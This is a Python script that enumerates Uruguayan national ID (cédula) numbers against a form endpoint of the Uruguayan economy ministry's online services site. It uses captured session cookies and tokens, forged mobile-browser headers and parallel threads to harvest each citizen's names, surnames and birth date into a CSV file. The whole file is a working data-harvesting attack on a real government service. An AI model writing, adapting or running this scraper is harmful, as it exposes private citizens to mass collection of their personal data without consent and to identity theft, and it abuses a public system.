import re
import os
import csv
import json
import html
import ciuy
import time
import requests
import argparse
import concurrent.futures
from queue import Queue
from threading import Lock
from datetime import datetime, timedelta

# Constants
JSON_FILE_PATH = 'sessions.json'
CITIZENS_CSV_FILE = 'citizens.csv'
CITIZENS_QUEUE = Queue()
LOCK = Lock()
processed_ci_count = 0
session_lock = Lock()  # Lock for thread-safe session updates

def find_and_extract_occurrence(large_string, occurrence, n):
    """Find the nth occurrence of a substring and extract the string that follows it."""
    index = -1
    for _ in range(n):
        index = large_string.find(occurrence, index + 1)
        if index == -1:
            raise ValueError(f"The string does not contain {n} occurrences of '{occurrence}'.")
    start_index = index + len(occurrence)
    end_index = large_string.find("'", start_index)
    if end_index == -1:
        raise ValueError("No closing single quote found after the occurrence.")
    return large_string[start_index:end_index]

def send_ci(ci, token_id, tab_id, cookie, timestamp1, timestamp2):
    """Send a CI (Cedula de Identidad) number to the specified URL with the necessary parameters."""
    url = (f"https://www.tramitesenlinea.mef.gub.uy/Apia/apia.execution.FormAction.run?"
           f"action=processFieldSubmit&isAjax=true&react=true&tabId={tab_id}&tokenId={token_id}&"
           f"timestamp={timestamp1}&attId=8461&frmId=6648&index=0&frmParent=E&timestamp={timestamp2}")
    
    payload = {
        'action': 'processFieldSubmit',
        'isAjax': 'true',
        'react': 'true',
        'tabId': tab_id,
        'tokenId': token_id,
        'timestamp': timestamp1,
        'attId': '8461',
        'frmId': '6648',
        'index': '0',
        'frmParent': 'E',
        'timestamp': timestamp2,
        'value': ci
    }
    
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,es-US;q=0.8,es;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie,
        'Dnt': '1',
        'Host': 'www.tramitesenlinea.mef.gub.uy',
        'Origin': 'https://www.tramitesenlinea.mef.gub.uy',
        'Referer': (f'https://www.tramitesenlinea.mef.gub.uy/Apia/apia.execution.FormAction.run?'
                    f'action=fireFieldEvent&currentTab=forms~0&tabId={tab_id}&tokenId={token_id}&'
                    f'fldId=2&frmId=6648&frmParent=E&index=0&evtId=1&attId=8461&react=true'),
        'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'
    }
    
    response = requests.post(url, data=payload, headers=headers)
    if response.status_code == 200:
        return response
    else:
        print(f"Error sending CI {ci}: {response.status_code}")
        return None

def make_request_and_store_data(ci, token_id, tab_id, cookie):
    """Make a request to the specified URL and store the extracted data in a queue."""
    url = (f"https://www.tramitesenlinea.mef.gub.uy/Apia/apia.execution.FormAction.run?"
           f"action=fireFieldEvent&currentTab=forms~0&tabId={tab_id}&tokenId={token_id}&"
           f'fldId=2&frmId=6648&frmParent=E&index=0&evtId=1&attId=8461&react=true')
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9,es-US;q=0.8,es;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie,
        'Dnt': '1',
        'Host': 'www.tramitesenlinea.mef.gub.uy',
        'Origin': 'https://www.tramitesenlinea.mef.gub.uy',
        'Referer': (f'https://www.tramitesenlinea.mef.gub.uy/Apia/apia.execution.FormAction.run?'
                    f'action=fireFieldEvent&currentTab=forms~0&tabId={tab_id}&tokenId={token_id}&'
                    f'fldId=3&frmId=6648&frmParent=E&index=0&evtId=1&attId=8462&react=true'),
        'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'
    }
    
    response = requests.post(url, headers=headers)
    if response.status_code != 200:
        print(f"Error making request: {response.status_code}")
        return None
    
    lines = response.text.split('\n')
    
    for line in lines:
        if line.startswith('<div id="E_6648"'):
            try:
                data = {
                    "CI": ci,
                    "Nombres": re.sub(r'&#(\d+);', lambda match: chr(int(match.group(1))), 
                                      html.unescape(find_and_extract_occurrence(line, "value='", 264))),
                    "Apellidos": re.sub(r'&#(\d+);', lambda match: chr(int(match.group(1))), 
                                        html.unescape(find_and_extract_occurrence(line, "value='", 265))),
                    "Nacimiento": re.sub(r'&#(\d+);', lambda match: chr(int(match.group(1))), 
                                                  html.unescape(find_and_extract_occurrence(line, "value='", 268)))
                }
                with LOCK:
                    CITIZENS_QUEUE.put(data)
            except ValueError as e:
                print(f"Error processing line: {e}")

def save_to_csv():
    """Save the collected data from the queue to a CSV file."""
    new_entries = []
    while not CITIZENS_QUEUE.empty():
        new_entries.append(CITIZENS_QUEUE.get())
    
    with LOCK:
        file_exists = os.path.isfile(CITIZENS_CSV_FILE)
        with open(CITIZENS_CSV_FILE, 'a', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['CI', 'Nombres', 'Apellidos', 'Nacimiento']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            if not file_exists:
                writer.writeheader()
            
            writer.writerows(new_entries)

def process_ci(ci, tab_id, token_id, timestamp1, timestamp2, cookie):
    """Process a single CI by sending it and making a request to store the data."""
    if ciuy.validate_ci(ci):
        response = send_ci(ci, token_id, tab_id, cookie, timestamp1, timestamp2)
        if response:
            make_request_and_store_data(ci, token_id, tab_id, cookie)
            global processed_ci_count
            with LOCK:
                processed_ci_count += 1
            print(f"Processed CI: {ci}")

def process_ci_range(range_start, range_end, session, sessions, session_index):
    """Process a range of CIs using a session."""
    for ci in range(range_start, range_end):
        process_ci(str(ci).zfill(8), session['tabId'], session['tokenId'], session['timestamp1'], session['timestamp2'], session['cookie'])
    
    # Update the session datetime
    with session_lock:
        sessions[session_index]['datetime'] = datetime.now().isoformat()
        with open(JSON_FILE_PATH, 'w', encoding='utf-8') as file:
            json.dump(sessions, file, ensure_ascii=False, indent=4)

def main():
    """Main function to read sessions, process CI ranges, and save the results to a CSV file."""
    global processed_ci_count

    # Argument parsing
    parser = argparse.ArgumentParser(description='Process a range of CIs.')
    parser.add_argument('--start', type=int, help='Start of the CI range.', required=True)
    parser.add_argument('--end', type=int, help='End of the CI range.', required=True)
    args = parser.parse_args()
    
    range_start = args.start
    range_end = args.end
    range_length = range_end - range_start
    
    # Read the sessions.json file
    with open(JSON_FILE_PATH, 'r', encoding='utf-8') as file:
        sessions = json.load(file)
    
    # Filter sessions to only use those within the last 30 minutes
    now = datetime.now()
    valid_sessions = [s for s in sessions if datetime.fromisoformat(s['datetime']) > now - timedelta(minutes=30)]
    
    if not valid_sessions:
        print("No valid sessions found within the last 30 minutes.")
        return
    
    # Calculate the segment size
    num_sessions = len(valid_sessions)
    segment_size = range_length // num_sessions
    
    # Function to process a segment
    def process_segment(i, session, session_index):
        segment_start = range_start + i * segment_size
        # Ensure the last segment goes up to range_end
        segment_end = range_start + (i + 1) * segment_size if i < num_sessions - 1 else range_end
        process_ci_range(segment_start, segment_end, session, sessions, session_index)
    
    # Start the timer
    start_time = time.time()
    
    # Use ThreadPoolExecutor to process segments in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_sessions) as executor:
        # Submit tasks to the executor
        futures = [executor.submit(process_segment, i, session, session_index) for i, (session_index, session) in enumerate(enumerate(valid_sessions))]
        # Wait for all futures to complete
        concurrent.futures.wait(futures)
    
    # Save to CSV after all sessions are processed
    save_to_csv()
    
    # End the timer and calculate the elapsed time
    end_time = time.time()
    elapsed_time = end_time - start_time
    
    print(f"All sessions processed in parallel. Execution time: {elapsed_time:.2f} seconds.")
    print(f"Total processed CIs: {processed_ci_count}")

if __name__ == "__main__":
    main()
